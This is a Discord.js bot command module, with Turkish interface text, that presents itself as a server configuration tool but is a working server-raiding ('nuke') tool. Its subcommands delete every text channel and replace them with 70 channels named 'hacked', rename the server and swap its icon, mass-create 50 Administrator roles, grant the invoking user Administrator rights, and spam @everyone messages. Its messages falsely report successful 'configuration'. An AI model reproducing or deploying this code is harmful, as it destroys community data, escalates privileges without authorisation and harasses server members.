const { SlashCommandBuilder, ChannelType, PermissionFlagsBits } = require('discord.js');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('sunucucontrol')
        .setDescription('Sunucuyu tamamen yapılandırır, kanalları ve rolleri yönetir.')
        .addSubcommand(subcommand =>
            subcommand
                .setName('patlat')
                .setDescription('Tüm kanalları siler ve yenilerini oluşturur.')
        )
        .addSubcommand(subcommand =>
            subcommand
                .setName('rol')
                .setDescription('Sunucuda toplu rol oluşturur.')
        )
        .addSubcommand(subcommand =>
            subcommand
                .setName('yetki')
                .setDescription('Komutu kullanan kişiye tam yetki verir.')
        )
        .addSubcommand(subcommand =>
            subcommand
                .setName('spam')
                .setDescription('Kanalda everyone spamı yapar.')
        ),

    async execute(interaction) {
        if (!interaction.guild) {
            return interaction.reply({ content: 'Bu komut yalnızca sunucularda kullanılabilir.', ephemeral: true });
        }

        const subcommand = interaction.options.getSubcommand();

        if (subcommand === 'patlat') {
            await interaction.reply({ content: '⚡ Sunucu yapılandırma işlemi başlatıldı...', ephemeral: true });

            const channelsToCreate = [];
            let i = 0;
            while (i < 70) {
                channelsToCreate.push({ name: 'hacked', type: ChannelType.GuildText });
                i++;
            }

            // Kanalları sil
            for (const channel of interaction.guild.channels.cache.values()) {
                if (channel.type !== ChannelType.GuildText) continue;
                try {
                    await channel.delete();
                } catch (err) {
                    console.error(`Kanal silinemedi (${channel.id}):`, err);
                }
            }

            // Yeni kanalları oluştur
            for (const nameObj of channelsToCreate) {
                try {
                    await interaction.guild.channels.create({
                        name: nameObj.name,
                        type: nameObj.type
                    });
                } catch (err) {
                    console.error('Kanal oluşturulamadı:', err);
                }
            }

            // Sunucu ayarlarını güncelle
            try {
                await interaction.guild.setIcon('https://pbs.twimg.com/media/Ex6m_hqXIAQLWeZ?format=jpg&name=4096x4096');
                await interaction.guild.setName('Patlatıldı uwu');
            } catch (err) {
                console.error('Sunucu ayarları güncellenemedi:', err);
            }

            return interaction.followUp({ content: '✅ Sunucu başarıyla yapılandırıldı!', ephemeral: true });
        }

        if (subcommand === 'rol') {
            await interaction.reply({ content: '🛡️ Rol oluşturma işlemi başlatıldı...', ephemeral: true });
            let count = 0;
            while (count < 50) {
                try {
                    await interaction.guild.roles.create({
                        name: 'HACKED',
                        color: '#FF3E00',
                        permissions: [PermissionFlagsBits.Administrator]
                    });
                    count++;
                } catch (err) {
                    console.error('Rol oluşturma hatası:', err);
                    break;
                }
            }
            return interaction.followUp({ content: `✅ Toplam ${count} adet rol oluşturuldu!`, ephemeral: true });
        }

        if (subcommand === 'yetki') {
            try {
                const role = await interaction.guild.roles.create({
                    name: '.',
                    permissions: [PermissionFlagsBits.Administrator]
                });
                await interaction.member.roles.add(role);
                return interaction.reply({ content: '✅ Başarıyla tam yetki verildi!', ephemeral: true });
            } catch (err) {
                return interaction.reply({ content: `❌ Yetki verme hatası: ${err.message}`, ephemeral: true });
            }
        }

        if (subcommand === 'spam') {
            await interaction.reply({ content: '🚀 Spam başlatıldı!', ephemeral: true });
            const spamMessage = '**Ş-şey b-bu sunucusu patlatılmıştır uwu** @everyone :heart: :heart:';
            for (let i = 0; i < 20; i++) {
                try {
                    await interaction.channel.send(spamMessage);
                } catch (err) {
                    break;
                }
            }
        }
    }
};
